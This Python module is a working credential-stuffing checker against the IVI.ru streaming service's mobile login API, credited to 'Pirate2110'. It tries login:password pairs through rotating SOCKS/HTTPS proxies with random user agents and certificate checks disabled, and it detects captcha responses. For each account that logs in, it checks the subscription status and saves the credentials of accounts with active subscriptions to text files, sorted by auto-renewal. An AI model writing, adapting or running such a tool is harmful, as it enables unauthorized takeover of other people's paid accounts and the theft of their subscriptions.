import requests
from utils.utils import Help
import os, sys

# Turning off warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Brute(object):
    def __init__(self):
        # ========================================
        # Project information
        self.projectName = "IVI"
        self.projectFullName = "IVI.ru"
        self.description = "Author : Pirate2110"

    def check(self, login, password, proxytype, proxy, timeout):
        try:
            # if proxy == null pass
            if proxy == "err":
                print("proxerr")
                pass
            else:
                with requests.session() as s:
                    # All what u need for project start - here
                    # ========================================
                    # Proxy
                    if proxytype == "no":
                        proxies = None
                    elif proxytype == "burp":
                        proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
                    elif proxytype == "https":
                        proxies = {'https': "http://" + proxy}
                    elif proxytype == "socks4":
                        proxies = {'https': "socks4://" + proxy}
                    elif proxytype == "socks5":
                        proxies = {'https': "socks5://" + proxy}

                    # ========================================
                    # Headers
                    headers = {'User-Agent': Help.getRandomUa()}

                    # Body
                    body = {'user_ab_bucket': '1927', 'password': password, 'device': 'Apple%20iPhone',
                            'app_version': '25641', 'email': login}
                    r = s.post("https://api.ivi.ru/mobileapi/user/login/ivi/v6/", data=body, proxies=proxies, verify=False,headers=headers, timeout=timeout)
                    if 'incorrect login or password' in r.text:
                        return "bad"
                    elif 'session' in r.text:
                        session = r.json()['result']['session']
                        r = requests.get("https://api.ivi.ru/mobileapi/billing/v1/subscription/info/?app_version=870&session=" + session, proxies=proxies, verify=False, timeout=timeout)
                        if len(r.json()['result']) > 0:
                            if r.json()['result']['expired'] == False:
                                if r.json()['result']['renew_enabled'] == True:
                                    Help.writelog("autorenew.txt", login + ":" + password + "|" + str(r.json()['result']['finish_time']).split('T')[0] + "| Autorenew")
                                    return "good"

                                else :
                                    Help.writelog("noautorenew.txt", login + ":" + password + "|" + str(r.json()['result']['finish_time']).split('T')[0])
                                    return "good"
                            else:
                                return "bad"
                        else:
                            return "bad"
                        #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
                    elif 'you shall not pass' in r.text:
                        return "captcha"
                    else :
                        return "projerror"
        except Exception as e:
            #  ========================================
            #  some info about error
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            #print(e, exc_type, fname, exc_tb.tb_lineno)
            return "error"
